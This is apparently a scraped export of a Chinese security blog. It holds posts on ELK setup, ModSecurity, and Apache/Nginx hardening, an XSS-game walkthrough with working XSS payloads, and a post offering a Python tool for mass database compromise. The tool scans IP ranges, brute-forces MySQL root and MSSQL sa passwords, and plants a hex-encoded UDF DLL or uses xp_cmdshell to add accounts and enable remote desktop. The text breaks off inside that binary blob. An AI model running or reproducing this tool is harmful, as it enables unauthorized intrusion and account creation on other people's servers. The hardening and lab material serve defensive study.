增加以下参数 vm.max_map_count=655360 执行以下命令，确保生效配置生效： sysctl -p 设置资源参数 vi /etc/security/limits.conf # 修改 * soft nofile 65536 * hard nofile 131072 * soft nproc 65536 * hard nproc 131072 设置用户资源参数 vi /etc/security/limits.d/20-nproc.conf # 设置elk用户参数 elk soft nproc 65536 启动elk需要非root用户，所以创建elk用户。 useradd elk #创建用户elk groupadd elk #创建组elk useradd elk -g elk #将用户添加到组 mkdir -pv /data/{data,logs} # 创建数据和日志目录 # 修改文件所有者 chown -R elk:elk /data/ chown -R elk:elk /etc/elasticsearch/ 切换到elk用户，启动服务 启动文件 /etc/elasticsearch/bin/elasticsearch 服务器要关闭防火墙 systemctl stop firewalld.service 这时候可以看到log输出，节点正常启动. 用浏览器访问，同时可以正常使用 安装Logstash下载解压 wget https://artifacts.elastic.co/downloads/logstash/logstash-6.4.2.tar.gz 在解压后目录执行 /usr/share/logstash/bin/logstash -e &#39;input { stdin { } } output { stdout {} }&#39; 在命令行输入什么内容讲原样输出，比如： 显示正常以后再去修改配置文件，需要自己添加，创建如下内容文件。 cat logstash-simple.conf input{ file { path =&gt; &quot;/var/log/httpd/*&quot; start_position =&gt; beginning } } output { stdout { codec=&gt; rubydebug } elasticsearch { hosts =&gt; &quot;192.168.253.132:9200&quot; protocol =&gt; &quot;http&quot; index =&gt; &quot;logstash-%{+YYYY-MM}&quot; } } 开启服务，执行如下命令： /usr/share/logstash/bin/logstash -f /usr/share/logstash/config/logstash-simple.conf 我们可以查看 ES 是否接收到了数据： Kibana的安装wget https://artifacts.elastic.co/downloads/kibana/kibana-6.4.2-linux-x86_64.tar.gz 编辑kibana.yml配置文件 vi /usr/share/kibana/config/kibana.yml 修改以下参数： server.port: 5601 #开启默认端口5601，本文修改默认端口为5602 server.host: “192.168.253.139” #站点地址 elasticsearch.url: http://192.168.253.139:9200 #指向elasticsearch服务的ip地址 kibana.index: “.kibana” 启动 执行以下命令启动： /usr/share/kibana/bin/kibana 测试浏览器访问 访问：http://192.168.253.139:5602 正常启动后，需要配置索引，设置logstash-* ，添加索引和Available fields后，点击Discover就可以看到logstash传输过来的日志信息。 然后可以手动添加fields参数或者创建图表。 yum 安装以上安装方式为下载配置安装，可以使用yum安装。 # 导入私钥 rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch # 添加yum源 vim /etc/yum.repos.d/es.repo yum源内容： [elasticsearch-6.x] name=Elasticsearch repository for 6.x packages baseurl=https://artifacts.elastic.co/packages/6.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md 执行安装： # 安装java + ELK yum install java-1.8.0-openjdk.x86_64 elasticsearch.noarch kibana.x86_64 logstash.noarch -y # 修改配置文件 vi /etc/logstash/logstash.yml vi /etc/elasticsearch/elasticsearch.yml vi /etc/kibana/kibana.yml # 启动服务 systemctl start logstash.service elasticsearch.service kibana.service 配置文件和上文相同修改，如若无法访问，关闭防火墙 。 参考链接： https://blog.csdn.net/KingBoyWorld/article/details/78555120 https://www.cnblogs.com/yuhuLin/p/7018858.html https://www.elastic.co/products","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"Apache中ModSecurity安装配置","slug":"Apache中ModSecurity安装配置","date":"2018-10-22T07:54:13.000Z","updated":"2018-10-22T10:28:19.050Z","comments":true,"path":"2018/10/Apache中ModSecurity安装配置/","link":"","permalink":"/2018/10/Apache中ModSecurity安装配置/","excerpt":"","text":"环境为centos 6.5 apache2.2 modsecurity2.9.2 安装mod_security的依赖 yum install gcc make httpd-devel libxml2 pcre-devel libxml2-devel curl-devel git 下载最新稳定的mod_security源代码 wget https://www.modsecurity.org/tarball/2.9.2/modsecurity-2.9.2.tar.gz 安装步骤： tar xzf modsecurity-2.9.2.tar.gz cd modsecurity-2.9.2 ./configure make install cp modsecurity.conf-recommended /etc/httpd/conf.d/modsecurity.conf cp unicode.mapping /etc/httpd/conf.d/ 安装完成后调整配置，修改httpd.conf LoadModule security2_module modules/mod_security2.so 如下配置，需要根据目录位置修改，因为modsecurity安装在/etc/httpd目录，配置文件在conf文件，所以不在写入以下配置。 &lt;IfModule security2_module&gt; Include conf.d/modsecurity.conf &lt;/IfModule&gt; 配置完成后下载owasp的规则： cd /etc/httpd git clone https://github.com/SpiderLabs/owasp-modsecurity-crs.git 或 wget https://github.com/SpiderLabs/owasp-modsecurity-crs/archive/v3.1.0-rc1.tar.gz mv owasp-modsecurity-crs modsecurity-crs cd modsecurity-crs cp crs-setup.conf.example modsecurity-crs-config.conf 在httpd.conf中修改 Include modsecurity-crs/modsecurity-crs-config.conf Include modsecurity-crs/rules/*.conf 修改完成后重启服务： service httpd restart 完成以后尝试SQL注入攻击，可以看到被拦截的页面。 在apache日志中查看error信息： 从上图可以看到拦截的类型和规则id，还有规则的目录文件。去对应的规则处查看规则文件，可以看到如下的规则匹配。 关于modsecurity的配置，根据各自设置的地址，比如当前地址为/etc/httpd/conf.d中。 SecRuleEngine On 设置为mod是否开启，默认设置为Detection Only，作用是只检测。Off则是关闭mod。 SecRequestBodyAccess On 检查请求体，默认开启，可以选择On或Off。 SecAuditEngine RelevantOnlySecAuditLogRelevantStatus “^(?:5|4(?!04))” SecAuditLogParts ABIJDEFHZ SecAuditLogType SerialSecAuditLog /var/log/modsec_audit.log 记录日志审计内容，文件地址等，如下图所示，ABCE等，修改SecAuditLogParts参数，可以记录不同的日志部分。对调试waf，修改配置策略很有用。 然后，如果需要修改其他配置项，比如403错误页面，直接再httpd.conf中修改403错误页面即可。 参考链接： http://www.vue5.com/centos/23142.html https://www.cnblogs.com/xiachj/p/4112194.html","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"Apache和Nginx安全配置","slug":"Apache和Nginx安全配置","date":"2018-10-09T08:21:20.000Z","updated":"2018-10-09T14:38:34.712Z","comments":true,"path":"2018/10/Apache和Nginx安全配置/","link":"","permalink":"/2018/10/Apache和Nginx安全配置/","excerpt":"","text":"apache安全配置apache运行原理Apache是基于模块化设计的，它的核心代码并不多，大多数的功能都被分散到各个模块中，各个模块在系统启动的时候按需载入。从配置文件中可以看到加载的各个模块。 apache在启动阶段采用root权限来获取更多的资源使用权限，这个时候会加载配置文件，模块，资源文件等，在下一个运行阶段，Apache为了获得系统资源最大的使用权限，将以特权用户root完成启动。分11个阶段处理用户的请求。 apache的两种工作模式Apache通过MPM(多路处理模块)来使用操作系统的资源，对进程和线程池进行管理。Apache为了能够获得更好的运行性能，针对不同的平台 (Unix/Linux、Window)提供了不同的MPM，用户可以根据实际情况进行选择，其中最常使用的MPM有 prefork和worker两种。 prefork 一个单独的控制进程(父进程)负责产生子进程，这些子进程用于监听请求并作出应答。Apache总是试图保持一些备用的 (spare)或是空闲的子进程用于迎接即将到来的请求。这样客户端就无需在得到服务前等候子进程的产生。在Unix系统中，父进程通常以root身份运行以便邦定80端口，而 Apache产生的子进程通常以一个低特权的用户运行。User和Group指令用于配置子进程的低特权用户。 worker 每个进程能够拥有的线程数量是固定的。服务器会根据负载情况增加或减少进程数量。一个单独的控制进程(父进程)负责子进程的建立。每个子进程能够建立 ThreadsPerChild数量的服务线程和一个监听线程，该监听线程监听接入请求并将其传递给服务线程处理和应答。Apache总是试图维持一个备 用(spare)或是空闲的服务线程池。这样，客户端无须等待新线程或新进程的建立即可得到处理。在Unix中，为了能够绑定80端口，父进程一般都是以 root身份启动，随后，Apache以较低权限的用户建立子进程和线程。User和Group指令用于配置Apache子进程的权限。 apache 在centos下配置apache配置文件，默认文件在/etc/httpd/conf/httpd.conf路径下 那么简单理解一下，配置参数的含义和使用，Allow和Deny可以用于apache的conf文件或者.htaccess文件中（配合Directory, Location, Files等），用来控制目录和文件的访问授权。所以，最常用的是：Order Deny,AllowAllow from All 注意“Deny,Allow”中间只有一个逗号，也只能有一个逗号，有空格都会出错；单词的大小写不限。上面设定的含义是先设定“先检查禁止设定，没有禁止的全部允许”，而第二句没有Deny，也就是没有禁止访问的设定，直接就是允许所有访问了。 但是如果想限制IP访问，如下写 Order Deny,Allow Deny from 192.168.1.1 Allow from all 这时候限制不起作用，Order取规则为最后一个Allow规则，首先限制IP访问，但是会继续查看Allow规定指定的信息，IP又在all中，所以限制不起作用。所以可以如下写： Order Deny,Allow Deny from 192.168.1.1 或者 Order Allow,Deny Allow from all Deny from 192.168.1.1 比如：如下的常用配置 1、在配置文件开始部分和下部有两个配置项，用来隐藏banner信息： ServerTokens OS 修改为：ServerTokens Prod （在出现错误页的时候不显示服务器操作系统的名称）ServerSignature On 修改为：ServerSignature Off （不回显apache版本信息） 2、apache在一些系统的默认配置中，开启目录浏览，所以可以使用以下关闭设置。 将Options Indexes FollowSymLinks 改为 Options -Indexes FollowSymLinks 3、取消部分目录的php执行权限 &lt;Directory &quot;/var/www/html/upload&quot;&gt; &lt;FilesMatch &quot;\\.(?i:php|php3|php5)$&quot;&gt; Deny from all &lt;/FilesMatch&gt; &lt;/Directory&gt; //在upload目录下，尽可能多匹配后缀php|php3|php5的文件，不分大小写。 还可以在主机配置文件中增加php_flag engine off指令即可，配置如下： Options FollowSymLinks AllowOverride None Order allow,deny Allow from all php_flag engine off 5、配置httpd.conf限制一些特殊目录的特定ip访问，如内部接口等。 &lt;Directory &quot;/var/www/html/aaa&quot;&gt; Order Deny,Allow Deny from all Allow from 192.168.1.111 &lt;/Directory&gt; 6、配置httpd.conf限制一些文件类型的访问，如txt的日志 &lt;Files ~ &quot;.txt$&quot;&gt; Order allow,deny Deny from all &lt;/Files&gt; 7、针对URL相对路径的禁止访问： &lt;Location /dir/&gt; Order allow,deny Deny from all &lt;/Location&gt; Nginx 安全配置nginx 工作原理Nginx由内核和模块组成，nginx核心模块包括：HTTP模块、EVENT模块和MAIL模块。nginx仅仅通过查找配置文件将客户端请求映射到一个location block（location是Nginx配置中的一个指令，用于URL匹配），而在这个location中所配置的每个指令将会启动不同的模块去完成相应的工作。nginx架构类似于Apache的Worker工作状态，Nginx的每一个Worker进程都管理着大量的线程，真正处理请求的是Worker之下的线程。 nginx本身不能处理PHP，它只是个web服务器，当接收到请求后，如果是php请求，则发给php解释器处理，并把结果返回给客户端。nginx一般是把请求发fastcgi管理进程处理，fastcgi管理进程选择cgi子进程处理结果并返回被nginx。 nginx涉及到两个账户，一个是nginx的运行账户，一个是php-fpm的运行账户。如果访问的是一个静态文件，则只需要nginx的运行账户对文件具有读取权限；而如果访问的是一个php文件，则首先需要nginx的运行账户对文件有读取权限，读取到文件后发现是一个php文件，则转发给php-fpm，此时则需要php-fpm账户对文件具有读取权限。 nginx 在centos下的安全配置 nginx设置问题 #隐藏 Nginx 的版本号，提高安全性。 server_tokens off; #开启高效文件传输模式，sendfile 指令指定 Nginx 是否调用sendfile 函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘 IO 重负载应用，可设置为 off，以平衡磁盘与网络 I/O 处理速度，降低系统的负载。 sendfile on; #是否开启目录列表访问，默认关闭。 autoindex off; 开头的配置 user www-data; //用户和组 worker_processes auto; //进程数 pid /run/nginx.pid; //进程文件 include /etc/nginx/modules-enabled/*.conf; //导入其他配置文件到nginx配置文件 events配置 events { worker_connections 768; //设置一个worker进程同时打开的最大连接数 # multi_accept on; //告诉nginx收到一个新连接通知后接受尽可能多的连接 } http配置 http { ## # Basic Settings ## sendfile on; //开启高效文件传输模式 tcp_nopush on; //告诉 Nginx 在一个数据包里发送所有头文件 tcp_nodelay on; //告诉 Nginx 不要缓存数据，而是一段一段的发送 keepalive_timeout 65; //连接超时时间，单位是秒 types_hash_max_size 2048; //上传文件大小限制 # server_tokens off; //隐藏 Nginx 的版本号 # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; //包含配置 default_type application/octet-stream; //默认传输类型 ## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; ## # Logging Settings ## access_log /var/log/nginx/access.log; //访问日志 error_log /var/log/nginx/error.log; //错误日志 ## # Gzip Settings ## gzip on; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; # gzip_buffers 16 8k; # gzip_http_version 1.1; # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } server配置 众所周知，Nginx的配置文件分为Server、Location、If等一些配置块，并且存在包含关系，和编程语言比较类似。如果在外层配置的一些选项，是可以被继承到内层的。 但这里的继承也有一些特性，比如add_header，子块中配置后将会覆盖父块中的add_header添加的所有HTTP头，造成一些安全隐患。 server配置在一些系统上不是默认的nginx配置，如果需要修改可以在nginx配置中添加，或者添加include，包含进其他的自定义server。 如下列代码，Server块添加了CSP头： server { ... add_header Content-Security-Policy &quot;default-src &#39;self&#39;&quot;; add_header X-Frame-Options DENY; location = /test { add_header X-Content-Type-Options nosniff; rewrite ^(.*)$ /xss.html break; } } 但/test的location中又添加了X-Content-Type-Options头，导致父块中的add_header全部失效。 禁止一个目录的访问示例：禁止访问path目录 location ^~ /path { deny all; } 可以把path换成实际需要的目录，目录path后是否带有”/“，带“/”会禁止访问该目录和该目录下所有文件。不带”/“的情况就有些复杂了，只要目录开头匹配上那个关键字就会禁止；注意要放在fastcgi配置之前。 这个常见于Nginx做反向代理的情况，动态的部分被proxy_pass传递给后端端口，而静态文件需要Nginx来处理。 假设静态文件存储在/home/目录下，而该目录在url中名字为files，那么就需要用alias设置目录的别名： location /files { alias /home/; } 此时，访问http://example.com/files/readme.txt，就可以获取/home/readme.txt文件。 但我们注意到，url上/files没有加后缀/，而alias设置的/home/是有后缀/的，这个/就导致我们可以从/home/目录穿越到他的上层目录。从而导致一个目录穿越问题。 禁止php文件的访问及执行 示例：去掉单个目录的PHP执行权限 location ~ /attachments/.*\\.(php|php5)?$ { deny all; } 示例：去掉多个目录的PHP执行权限 location ~ /(attachments|upload)/.*\\.(php|php5)?$ { deny all; } 禁止IP的访问 示例：禁止IP段的写法： deny 10.0.0.0/24; 示例：只允许某个IP或某个IP段用户访问，其它的用户全都禁止 allow x.x.x.x; allow 10.0.0.0/24; deny all; 禁用非必要的方法 if ($request_method !~ ^(GET|HEAD|POST)$ ) { return 444; } 禁用扩展名 location ~* .(txt|doc|sql|gz|svn|git)$ { deny all; } 根据用户的真实 IP 做连接限制 ## 这里取得原始用户的IP地址 map $http_x_forwarded_for $clientRealIp { &quot;&quot; $remote_addr; ~^(?P&lt;firstAddr&gt;[0-9\\.]+),?.*$ $firstAddr; } ## 针对原始用户 IP 地址做限制 limit_conn_zone $clientRealIp zone=TotalConnLimitZone:20m ; limit_conn TotalConnLimitZone 50; limit_conn_log_level notice; ## 针对原始用户 IP 地址做限制 limit_req_zone $clientRealIp zone=ConnLimitZone:20m rate=10r/s; #limit_req zone=ConnLimitZone burst=10 nodelay; limit_req_log_level notice; 参考资料： https://www.cnblogs.com/chenpingzhao/p/5785416.html https://wooyun.kieran.top/#!/drops/201.Nginx%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E7%A0%94%E7%A9%B6 https://wooyun.kieran.top/#!/drops/315.Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE https://blog.csdn.net/yf3585595511/article/details/54933646","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"XSS GAME记录","slug":"XSS-GAME记录","date":"2018-10-05T12:05:20.000Z","updated":"2019-03-12T02:43:55.753Z","comments":true,"path":"2018/10/XSS-GAME记录/","link":"","permalink":"/2018/10/XSS-GAME记录/","excerpt":"","text":"在安全文摘上看到一篇前端安全的文章，最后提到了几个xss在线游戏，有两个是之前就见过的，一个没玩过，好像也是之前的xss游戏。 文章地址：https://segmentfault.com/a/1190000016551188 首先看第一关，此网站需要科学上网。 https://xss-game.appspot.com/level1 页面可以看到所用的html代码和js，以及后端的py代码，简单尝试一下，可以发现是写入页面。 并且从code中可以看到，没有过滤，直接 &lt;script&gt;alert(2)&lt;/script&gt; 第二关，留言框，post提交数据，直接插入图片。 &lt;img src=@ onerror=alert(2)&gt; 第三关，从链接猜测是锚点xss，尝试修改锚点，发现写入页面。 但是尝试后发现，并不是直接写入如上图所示页面那么简单，而是写入了img标签 查看其中的js代码，然后使用如下payload即可。 &#39; onerror=alert(2) &#39; 第四关，点击页面按钮后显示如下，猜测是在timer的xss，查看页面代码。 在timer.html页面下可以发现如下代码，基本可以断定是写入img标签的xss，直接使用onload事件，使用连字符直接alert()。 &#39;-alert(2)-&#39; 第五关，访问后是一个登陆后的页面，这里我们先退出页面。 sign up后可以看到，有输入email的地方，和next两个参数输入点，一开始以为是输入框的问题，尝试多次发现没有写入页面。 然后再signup.html页面下发现如下内容 初步判断是next参数的问题，也就是next写入img标签，尝试如下，必须点击next，一开始点击GO，一直没触发。 javascript:alert(2)","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"批量获取数据库权限","slug":"批量获取数据库权限","date":"2018-09-28T02:05:11.000Z","updated":"2018-09-28T10:55:57.503Z","comments":true,"path":"2018/09/批量获取数据库权限/","link":"","permalink":"/2018/09/批量获取数据库权限/","excerpt":"","text":"眼看要到十一国庆小长假了，打算长假前写篇文章，巧合看到一篇老博文，dub ZJ居然要价七千，所以干脆写一个数据库ZJ脚本。 利用以下几点： 获取3306端口是否开放，开放后猜测root密码，密码猜测成功后，执行写入udf.dll，利用udf添加账号密码 。 获取1433端口是否开放，开放后猜测sa密码，密码猜测成功后，执行xp_cmdshell，2005以上就默认关闭了，获取sa权限之后重新开启，但还是需要在2008之前，利用xp_cmdshell写入远程账号密码。不过当用户已AUTHORITY\\NetworkService登陆时时（mssql2005express版默认）无法执行net user命令添加用户。只考虑了开启或者关闭xp_cmdshell的情况，删除的话暂不处理。 以上只针对Windows系统，数据库版本不高。 之所以采用这两种形式，一旦可以写入的话，即便没开启远程桌面，也可以利用udf或者xp_cmdshell开启远程桌面。 本地需要ip.txt 写入测试的IP网段，成功的会写入本地mysql，或者mssql 的txt文件。 如此，直接上代码，本地测试mysql没发现问题，如有考虑不周的或者认识错误的请告知。 `#coding:utf-8 import MySQLdb import pymssql import IPy import threading import Queue import socket import binascii class thread(threading.Thread): def init(self,queue): threading.Thread.init(self) self._queue = queue def run(self): while not self._queue.empty(): queue = self._queue.get(timeout=0.5) try: sock = socket.socket() sock.settimeout(2) try: sock.connect((queue, 3306)) print u&quot;检测到&quot; + queue + u&quot;:3306端口开放，测试中。。。&quot; self.mysql(queue) except: print queue + u&#39;:3306 端口关闭&#39; try: sock.connect((queue, 1433)) print u&quot;检测到&quot; + queue + u&quot;:1433端口开放，测试中。。。&quot; self.mssql(queue) except: print queue + u&#39;:1433 端口关闭&#39; except: continue def mysql(self,queue): with open(&#39;mm.txt&#39;,&#39;r&#39;) as f: file = f.readlines() for mm in file: try: db = MySQLdb.connect(queue, &quot;root&quot;, mm.strip(&#39;\\n&#39;), &quot;mysql&quot;, connect_timeout=2) print u&quot;爆破%s:3306端口成功，账号密码为: root/%s&quot; %(queue, mm.strip(&#39;\\n&#39;)) cursor = db.cursor() cursor.execute(&quot;SELECT VERSION()&quot;) data = cursor.fetchone() udf = binascii.a2b_hex(&quot;4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000F80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000004D477BD0092615830926158309261583005E86830B261583005E808308261583005E968307261583005E91830B2615832EE06E830A2615830926148325261583005E9C8308261583005E878308261583005E8483082615835269636809261583000000000000000000000000000000000000000000000000504500004C0103004AFE9F5A0000000000000000E00002210B010900001000000010000000600000607C0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007C83000008020000B4820000C800000000800000B402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002C7E00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000E0555058310000000000100000007000000010000000040000000000000000000000000000400000E02E7273726300000000100000008000000006000000140000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D090208B92BCF11B11CEEA24F550000560C000000220000260000A8FFFFFFFF8B4C240833C03901741656578B7C24146A0C59BE000010DCF3A566A55FB0015E5DFB77FBC38B44240C1A6A071611108BF8183218FF63DB6F1CA45FC7011E1200210883380175128B40040DF6776F0700750A1004C6000132C0C3530ABF1DF68D3C3053A454082D08FF30FF15FFF6EE776C885985C075085614C601011BC8568D71018A11FD6FDFFE4184D275F98B54142BCE890A32558BEC8B4D0C833902B7D860BF5374148B7D10915C5453EB4CBF9DBDDF8B417D740F1B707C1BEBE5836004DBB1FFB7001A0C8B48048B008D4401025072A0594C08DFC8D7B5891678113006A44CEB6C57BEB7B2B85F5E5DA30421740833DBB63FF6A8591353568B742410D878534602DB85DB5BB6460851C78D5C4257E8240B75EEEEBFE01400C604070008FF70041E0553B1DB1B921A22C418535720030054090F09B7086A995B0F98599954CF2D343713B8F4540B1EDEB60D818403552251519D35DFFED6FEDF576800F762D66A018945FC068BF08B4560DD7FF70CC606004533FF595939387471683CC071C6FEDFDA9C12260C3BC7745B506A04FF75FC149073E1EDD7A9FD48533AFC8D48911040B963DBFF2BC18BD88D043B505630F8268C5330D8AD8DBD5F03FE570E940DE57DF8463FE6364C2066BA5B1810A4803E0059169EB0FF741A8BC6C64437FF00594D1489C906987BEBD86F183E5F205EC9C3EED7B235DCBAF37D574708C45030087BDBDACDC9C26A4078C710548D4601B9E07E614251724F0856FF31CF6BAFDD9DB694C66AFF8DC32082F63A58B0B6030D092C23005F7CC36E57036C6A081D1290AC0AA88365FC2F6C2F2C2D4592D0EB071B408F65E8C70BBFD66E42FEFF000D1FEDC25E3BFFDB17B60D08209A02F3C3E90806F58BFF56688000002D8C6D675880985608845AA3BDE0FEBB062358045485F675054DAA83260076FBB7DB4508C36F08ED09ACC704240607FF0B4C113637598D71FFCF9C0BBF77DFC9750E39056B107E3CFF7310830B01FBEEC6BB8B0910548B098F57890A23480F85D47D618CBBAD641718068B79040838071B76EDEEBB1E50EB184AA705B8E61768B0B030D8E803A83C0957C1D6BBAEB5D6A1E7E9E2573CA12F4C6A6FF777C3025EFD096A1FEE76EB3CAA10C80475ED7BEFC0C7051F281A70E027071BDFF79D5CB520BC04B81B6A5635B952EB782B7339B2E3696FF7DEFD7340393D155C741C68062809AC43DB6B85850D9E1034252316FFE666F862F154B201DC0801592CC2B1A1DB78049DDFDBF62413D90FD4FC83F80266B16F6CB0D2595BFFA0584B77783BB5783106350F8487C71996EE4CD3543BF81810897D82EFC796BE35FAC87251833F8AF36A7C398587B4F10774E9FFC8D60F7C89C5DB9BB5D955F85615441B474DED5BE38EF88A394D1003D00874B48909437AA36D020C1AD3F8EBA71C3162CC5A64442E386161FB0A58064C32FC19503F1BDF720443375BC9C20CC710FB02231FB2288B2EF28B5D081CAE0FDB9B54E433C95CFC7D2008016C2DC6C23BF15A393A4417E4D61BFE7FAFAE3BF0740583FE02752E1910D03BC1E7166EB8ED57565FD03B5EE40003937B703B67115A039614168012376C7D270A8227FEA0246420575062B30D661327002F527F8DF61AD2061153F76A037543B067BB614F34032168742E2C0D2C3CEC257FEB1B71EC5A09706A7C6FAAE05051597C64825D900EADF62FFA8A19066B8F91B6C72AE490C396EC1640E134A9FF3B246ABB41C1F17926547DBC550C0D381E33BC05BC595D382281EC2832F7869F365F212043211C895E2118891D05F78EC243143C21A2AA210C668C186C5FFBDA3806252C0620080605DD2DCDD20425002D7FFC9C8F7AB6B1F6143095562407042831D6FEDB7F0807348B85E0FCA0AA701DDBB5B395011C1920241318092B18476A565F201CB360C32C9F7B8985D8320A04DC03B557E01B243468DEDFD1F7D8D360CE2879D40A2C833D208DBDC3DA00F923685B1B300BDFAF67F534C97F23401EC25F6A4849918F144A50152E9DF458AAF8A29C10F3EB67611C7E052C37D4598FEDED8321B9273551E0F5EE3BDC0ABF03E4507F4B8417185BDB7E600BCE1CDC142CD6E288B154B609E01B14F413160A4BDB313DDCDBFFDC84676CC859D94E1E07F7D81BF076BBB7C00359485D1656B8BC18BE04A3638B6F2AF83BC673080753025073D85F60835A3BFE72F15F5E25206C6053C820CC006F35B4DD452BB84D5A346627040B85BF2B5E6E413C03C1813850E45FEFA5ECFFFB33D2B90B011C48180F94C28BC25DC33FB702BF35E34831C80FB74114AE057106C1A55B6C33578C081817761BFFFF2FF1D7487BF972098B580803D93BFB720A4283C0283BD67270CA36B5E86AE55DC38F6AFEF0CD71F7A970040B056418005083EC080DB7C670082F316C33C576F0852F06DF64A31A89B90968555DB7F081F0B2091C6B04F555972DD12C937D1350195C083B04E1C26F2724C1E81FF715E0018FEFB6532B034F230059948BE55DC3621DDB49A301CA3DAFC0FAE99525242631CCFF29343232B61058054C50AC2CB41E97AF12B60D56096B27D7616B20CFB0FBEF2AE4E03160031F73D9665B9A6C038D2BE0FAFC046BA039F13CB4FC8A0D6C120C7D0DC395C3C1619C965154147FE41F3E783124F020140BDAC40E5643B25D53EC1068F885626DF4F888C9BF4EE640BB25EEA0398466820D85C33149DB9F0A359A04EB605675F869639FC1F6448B7598751F1033F0071476E6CA20189D271CB4F6EE6FEDF4330C113BF77507BE4F59EB0B85F30A7B047EA10AC1E0100BF0CE00F7D6076C840D1E045E5F01C33F5C05646464646064686C1405766474B000003FF4C20E034B0F20185F4E6F20FFFFB7FF617267756D656E7473096C6C6F77656420287564663A206C69625F6DCCFD6DF77973716C0D5F73085F696E666F293918DFB6FF8F2076657273696F6E20302E01341F45787065F6DBDBDD637447657861076C79201A65207374723F5BDB5AFB672074791B75726171217258C00E602B7477911FD86F030B3F8672206E616D48DBB1B71F436F756C246E6F74C4636113203058B76D186D2779AF72F1483FDA4D943F2003121071051BF29D5860214707D0604D0D0B0F81CB074ED961DD9703AB17CC2708A77527ECC00FD81F0A3B034FC0A07B851F03240328C1556583A200C5889251CA22D877BDB119BF44FF000F5565A3AA00A8AA9251645455C95532AAAAFFF61D455C0410020157616974466F00FC06C07253886C654F626A07C07F6B99145669727475616C417603E0F6370D536574456E76126F6EC000BC6DBF5661726961622B4118437265F76DEB6E94546806640D47264375727222CD12F65B502A636573734914266E03E083135469636BDE6E6BB1F6B6FD5175657279500366846D616E371667EF1B00FD0144697367374CFDB7EDED6962727879436192731A4973446562756767EDEE6DAD266A686546A4556E6840B1B7B7B7643164457846707469AF46696C4A6D295B6119B41254DE64AEB0176D0DD8114990B9EDD61A0A6B409D6D70876547C25A73CD517F77555122B4ED6E591B5C537973186DEEC3C2EB2E39417373650975697CDB15DA434C7D5F687E396D5F2EDFFEDEBE5F616D7367087869740B646A753A5F666469EC4217B076260A639A5F64FD6CADB91F5F686F6F6B131459725FF802700148D15FDB9CEB0249730A330A6C21D6F0BD82539C2A64D46E640893050B130F651E6B5B7BC25F2C723456ED6D1C182FF6D69A700A035F706F522947E1DDBE6E106468756C5EB92A6BCB92BD9B1B2CA806E0B6D86E6EC57265250866112E827BDB5673749C637079082439EDCD5C6B32C06E4D0FD7ED1F5AC36F7319663A1F5F4370705831C75E3B8474BC6D343F001817FFFFFFFF3D193C1C1B161E55142D16270815270F11115F10130A070D2E17090705160C1E7FFBFFFF080A0B160918181505061B050C10060717062105110F061421110B08E4FBDFB62B22052A111D0D18532D483806000776FBDBE5080C09330A090B0C051007061612EEDFFEED0E0B34150B18160D3D0542C205121E14066930FFD8DDFF110C0E1D4D0517230D0C3224080B4506F0DE041004F03B0A6EFF2C01043808041C1C0204003E4C016DFF21FD05004AFE9F5A8FE00002210B0109080C634F7AD60C1213D616A300200E10C10A01630B02AB3362B7EE6107006003040233351EEED9C0CE34100706C02633D6EDDB7620AC22033C144002B0021C5759DD0050520143C8C8BA65B1214200A7B82F06DB5D182EB4787407EA0B900C5BFA90CDB742602E72647D610861C90E76C508FB0A00C700A1DB66BB77402E26300304301BECDB943D001A27C04F73726300EB11C0061B40731C4F78C2C2A365761F01030002ED7760497B27421BA023030000EDD8D152127C53030400000000000080FF00000000000000000000807C2408010F85B901000060BE007000108DBE00A0FFFF5783CDFFEB0D9090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B92A0000008A07472CE83C0177F7803F0075F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE005000008B0709C0743C8B5F048D8430B472000001F35083C708FF96F0720000958A074708C074DC89F95748F2AE55FF96F472000009C07407890383C304EBE16131C0C20C0083C7048D5EFC31C08A074709C074223CEF771101C38B0386C4C1C01086C401F08903EBE2240FC1E010668B0783C702EBE28BAEF87200008DBE00F0FFFFBB00